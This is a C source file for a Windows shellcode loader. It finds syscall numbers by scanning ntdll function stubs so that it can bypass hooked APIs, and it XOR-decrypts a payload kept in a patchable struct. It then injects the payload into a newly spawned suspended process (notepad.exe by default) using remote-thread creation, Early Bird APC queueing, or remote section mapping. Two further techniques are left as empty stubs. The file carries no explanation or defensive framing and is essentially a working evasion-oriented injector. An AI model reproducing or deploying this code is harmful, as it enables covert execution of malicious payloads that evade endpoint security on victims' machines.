#include <windows.h>

#define PAYLOAD_MARKER 0xDEADBEEF
#define MAX_PAYLOAD_SIZE 8192
#define MAX_PROCESS_NAME 256

DWORD wNtAllocateVirtualMemory;
DWORD wNtWriteVirtualMemory;
DWORD wNtProtectVirtualMemory;
DWORD wNtCreateThreadEx;
DWORD wNtQueueApcThread;
DWORD wNtCreateSection;
DWORD wNtMapViewOfSection;
DWORD wNtUnmapViewOfSection;
DWORD wNtResumeThread;
DWORD wNtClose;

extern NTSTATUS SysNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
extern NTSTATUS SysNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);
extern NTSTATUS SysNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
extern NTSTATUS SysNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
extern NTSTATUS SysNtQueueApcThread(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);
extern NTSTATUS SysNtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
extern NTSTATUS SysNtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
extern NTSTATUS SysNtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);
extern NTSTATUS SysNtResumeThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
extern NTSTATUS SysNtClose(HANDLE Handle);

#pragma pack(push, 1)
typedef struct {
	DWORD payload_size;
	unsigned char payload[MAX_PAYLOAD_SIZE];
	unsigned char xor_key;
	unsigned char technique;
	char target_process[MAX_PROCESS_NAME];
} PatchData;
#pragma pack(pop)

PatchData patch_data = {
	PAYLOAD_MARKER,
	{0},
	0,
	0,
	"notepad.exe"
};

DWORD GetSSN(PBYTE func_addr) {
	if (func_addr[0] == 0x4C && func_addr[1] == 0x8B && func_addr[2] == 0xD1 && func_addr[3] == 0xB8) {
		return *(DWORD*)(func_addr + 4);
	}

	if (func_addr[0] == 0xE9) {
		return 0;
	}

	DWORD ssn = 0;
	WORD idx = 1;

	while (TRUE) {
		if (func_addr[idx * 32] == 0x4C && func_addr[idx * 32 + 1] == 0x8B && func_addr[idx * 32 + 2] == 0xD1 && func_addr[idx * 32 + 3] == 0xB8) {
			ssn = *(DWORD*)(func_addr + idx * 32 + 4);
			return ssn - idx;
		}

		idx++;
		if (idx > 500) {
			break;
		}
	}

	idx = 1;
	while (TRUE) {
		if (func_addr[0 - (idx * 32)] == 0x4C && func_addr[1 - (idx * 32)] == 0x8B && func_addr[2 - (idx * 32)] == 0xD1 && func_addr[3 - (idx * 32)] == 0xB8) {
			ssn = *(DWORD*)(func_addr + 4 - (idx * 32));
			return ssn + idx;
		}

		idx++;
		if (idx > 500) {
			break;
		}
	}

	return 0;
}

BOOL ResolveSyscalls() {
	HMODULE hNtdll;
	PBYTE addr;

	hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) {
		return FALSE;
	}

	addr = (PBYTE)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	if (!addr) return FALSE;
	wNtAllocateVirtualMemory = GetSSN(addr);
	if (!wNtAllocateVirtualMemory) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	if (!addr) return FALSE;
	wNtWriteVirtualMemory = GetSSN(addr);
	if (!wNtWriteVirtualMemory) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	if (!addr) return FALSE;
	wNtProtectVirtualMemory = GetSSN(addr);
	if (!wNtProtectVirtualMemory) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtCreateThreadEx");
	if (!addr) return FALSE;
	wNtCreateThreadEx = GetSSN(addr);
	if (!wNtCreateThreadEx) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtQueueApcThread");
	if (!addr) return FALSE;
	wNtQueueApcThread = GetSSN(addr);
	if (!wNtQueueApcThread) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtCreateSection");
	if (!addr) return FALSE;
	wNtCreateSection = GetSSN(addr);
	if (!wNtCreateSection) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtMapViewOfSection");
	if (!addr) return FALSE;
	wNtMapViewOfSection = GetSSN(addr);
	if (!wNtMapViewOfSection) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	if (!addr) return FALSE;
	wNtUnmapViewOfSection = GetSSN(addr);
	if (!wNtUnmapViewOfSection) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtResumeThread");
	if (!addr) return FALSE;
	wNtResumeThread = GetSSN(addr);
	if (!wNtResumeThread) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtClose");
	if (!addr) return FALSE;
	wNtClose = GetSSN(addr);
	if (!wNtClose) return FALSE;

	return TRUE;
}

void decrypt_payload() {
	DWORD i;
	if (patch_data.xor_key != 0) {
		for (i = 0; i < patch_data.payload_size; i++) {
			patch_data.payload[i] ^= patch_data.xor_key;
		}
	}
}

void inject_create_remote_thread() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPVOID buf = NULL;
	SIZE_T region_size;
	HANDLE hThread = NULL;
	DWORD old;
	char cmd[MAX_PROCESS_NAME];

	region_size = patch_data.payload_size;
	lstrcpyA(cmd, patch_data.target_process);

	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		return;
	}

	if (SysNtAllocateVirtualMemory(pi.hProcess, &buf, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
		TerminateProcess(pi.hProcess, 0);
		SysNtClose(pi.hProcess);
		SysNtClose(pi.hThread);
		return;
	}

	if (SysNtWriteVirtualMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL) != 0) {
		TerminateProcess(pi.hProcess, 0);
		SysNtClose(pi.hProcess);
		SysNtClose(pi.hThread);
		return;
	}

	if (SysNtProtectVirtualMemory(pi.hProcess, &buf, &region_size, PAGE_EXECUTE_READ, &old) != 0) {
		TerminateProcess(pi.hProcess, 0);
		SysNtClose(pi.hProcess);
		SysNtClose(pi.hThread);
		return;
	}

	if (SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, pi.hProcess, buf, NULL, FALSE, 0, 0, 0, NULL) == 0) {
		SysNtClose(hThread);
	}

	SysNtResumeThread(pi.hThread, NULL);
	SysNtClose(pi.hProcess);
	SysNtClose(pi.hThread);
}

void inject_early_bird_apc() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPVOID buf = NULL;
	SIZE_T region_size;
	DWORD old;
	char cmd[MAX_PROCESS_NAME];

	region_size = patch_data.payload_size;
	lstrcpyA(cmd, patch_data.target_process);

	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		return;
	}

	if (SysNtAllocateVirtualMemory(pi.hProcess, &buf, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
		TerminateProcess(pi.hProcess, 0);
		SysNtClose(pi.hProcess);
		SysNtClose(pi.hThread);
		return;
	}

	if (SysNtWriteVirtualMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL) != 0) {
		TerminateProcess(pi.hProcess, 0);
		SysNtClose(pi.hProcess);
		SysNtClose(pi.hThread);
		return;
	}

	if (SysNtProtectVirtualMemory(pi.hProcess, &buf, &region_size, PAGE_EXECUTE_READ, &old) != 0) {
		TerminateProcess(pi.hProcess, 0);
		SysNtClose(pi.hProcess);
		SysNtClose(pi.hThread);
		return;
	}

	if (SysNtQueueApcThread(pi.hThread, buf, NULL, NULL, NULL) != 0) {
		TerminateProcess(pi.hProcess, 0);
		SysNtClose(pi.hProcess);
		SysNtClose(pi.hThread);
		return;
	}

	SysNtResumeThread(pi.hThread, NULL);
	SysNtClose(pi.hProcess);
	SysNtClose(pi.hThread);
}

void inject_thread_hijacking() {

}

void inject_process_hollowing() {

}

void inject_remote_mapping() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	HANDLE hSection = NULL;
	LPVOID local_view = NULL;
	LPVOID remote_view = NULL;
	SIZE_T view_size = 0;
	LARGE_INTEGER section_size;
	HANDLE hThread = NULL;
	char cmd[MAX_PROCESS_NAME];

	section_size.QuadPart = patch_data.payload_size;

	if (SysNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &section_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != 0) {
		return;
	}

	view_size = patch_data.payload_size;
	if (SysNtMapViewOfSection(hSection, GetCurrentProcess(), &local_view, 0, 0, NULL, &view_size, 1, 0, PAGE_READWRITE) != 0) {
		SysNtClose(hSection);
		return;
	}

	memcpy(local_view, patch_data.payload, patch_data.payload_size);

	lstrcpyA(cmd, patch_data.target_process);

	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		SysNtUnmapViewOfSection(GetCurrentProcess(), local_view);
		SysNtClose(hSection);
		return;
	}

	view_size = 0;
	if (SysNtMapViewOfSection(hSection, pi.hProcess, &remote_view, 0, 0, NULL, &view_size, 1, 0, PAGE_EXECUTE_READ) != 0) {
		SysNtUnmapViewOfSection(GetCurrentProcess(), local_view);
		SysNtClose(hSection);
		TerminateProcess(pi.hProcess, 0);
		SysNtClose(pi.hProcess);
		SysNtClose(pi.hThread);
		return;
	}

	if (SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, pi.hProcess, remote_view, NULL, FALSE, 0, 0, 0, NULL) == 0) {
		SysNtClose(hThread);
	}

	SysNtResumeThread(pi.hThread, NULL);
	SysNtUnmapViewOfSection(GetCurrentProcess(), local_view);
	SysNtClose(hSection);
	SysNtClose(pi.hProcess);
	SysNtClose(pi.hThread);
}

typedef void (*InjectionFunc)();

InjectionFunc injection_techniques[] = {
	inject_create_remote_thread,
	inject_early_bird_apc,
	inject_thread_hijacking,
	inject_process_hollowing,
	inject_remote_mapping
};

int main() {
	if (patch_data.payload_size == 0 || patch_data.payload_size == PAYLOAD_MARKER || patch_data.payload_size > MAX_PAYLOAD_SIZE) {
		return 1;
	}

	if (patch_data.technique >= 5) {
		return 1;
	}

	if (!ResolveSyscalls()) {
		return 1;
	}

	decrypt_payload();
	injection_techniques[patch_data.technique]();
	return 0;
}
